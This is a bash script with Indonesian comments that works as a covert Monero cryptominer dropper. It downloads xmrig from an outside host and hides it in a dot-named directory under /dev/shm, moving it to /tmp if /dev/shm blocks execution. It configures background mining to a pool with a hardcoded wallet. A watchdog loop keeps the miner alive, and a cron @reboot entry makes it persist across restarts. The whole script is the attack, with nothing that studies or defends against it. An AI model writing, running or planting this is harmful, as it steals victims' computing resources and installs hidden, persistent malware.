#!/bin/bash

# ===== Konfigurasi =====
WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"
STEALTH_DIR="/dev/shm/.c3pool"
MINER_SUBDIR="$STEALTH_DIR/c3pool"

# ===== Setup Direktori =====
mkdir -p "$MINER_SUBDIR"
cd "$MINER_SUBDIR" || exit 1

# ===== Unduh dan Ekstrak xmrig =====
echo "[*] Mengunduh xmrig.tar.gz..."
curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz -o xmrig.tar.gz

if file xmrig.tar.gz | grep -q 'gzip compressed'; then
    echo "[*] Mengekstrak..."
    tar -xzf xmrig.tar.gz
    chmod +x xmrig
else
    echo "[!] Gagal: Bukan file gzip valid"
    exit 1
fi

# ===== Deteksi noexec dan simpan path eksekusi =====
BIN_PATH="$MINER_SUBDIR/xmrig"
if ! "$BIN_PATH" --help > /dev/null 2>&1; then
    echo "[!] xmrig tidak bisa dijalankan di $MINER_SUBDIR, kemungkinan /dev/shm noexec"
    TMP_BIN="/tmp/xmrig"
    cp "$BIN_PATH" "$TMP_BIN"
    chmod +x "$TMP_BIN"
    if "$TMP_BIN" --help > /dev/null 2>&1; then
        echo "[*] xmrig dapat dijalankan dari /tmp"
        BIN_PATH="$TMP_BIN"
    else
        echo "[!] Gagal: xmrig tidak bisa dijalankan dari /tmp juga"
        exit 1
    fi
fi
echo "$BIN_PATH" > "$MINER_SUBDIR/.binpath"

# ===== Buat konfigurasi =====
cat > config_background.json <<EOF
{
    "autosave": true,
    "background": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.c3pool.com:13333",
            "user": "$WALLET",
            "pass": "c3pool",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

# ===== Watchdog Script =====
echo "[*] Membuat watchdog.sh..."
cat > "$STEALTH_DIR/watchdog.sh" <<'EOF'
#!/bin/bash
BIN=$(cat /dev/shm/.c3pool/c3pool/.binpath)
CONFIG="/dev/shm/.c3pool/c3pool/config_background.json"
LOGFILE="/dev/shm/.c3pool/c3pool/xmrig.log"

while true; do
    if ! pgrep -f "$BIN" > /dev/null; then
        echo "[$(date)] xmrig tidak berjalan. Memulai ulang..." >> "$LOGFILE"
        "$BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 &
    fi
    sleep 30
done
EOF

chmod +x "$STEALTH_DIR/watchdog.sh"
pkill -f "$STEALTH_DIR/watchdog.sh" 2>/dev/null

# ===== Jalankan Watchdog =====
echo "[*] Menjalankan watchdog di background..."

if command -v bash >/dev/null 2>&1; then
    CMD="bash \"$STEALTH_DIR/watchdog.sh\""
else
    CMD="sh \"$STEALTH_DIR/watchdog.sh\""
fi

if command -v nohup >/dev/null 2>&1; then
    eval "nohup $CMD > /dev/null 2>&1 &"
else
    eval "$CMD > /dev/null 2>&1 &"
fi

# ===== Verifikasi Watchdog =====
sleep 2
if pgrep -f "watchdog.sh" > /dev/null; then
    echo "[✓] Watchdog aktif di background."
else
    echo "[!] Gagal menjalankan watchdog!"
fi

# ===== Tambahkan ke crontab jika ada =====
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null; echo "@reboot $CMD > /dev/null 2>&1 &") | crontab -
    echo "[*] Cron @reboot ditambahkan."
else
    echo "[!] crontab tidak ditemukan. Lewati autostart."
fi

echo "[✓] Selesai. xmrig disimpan di: $BIN_PATH"
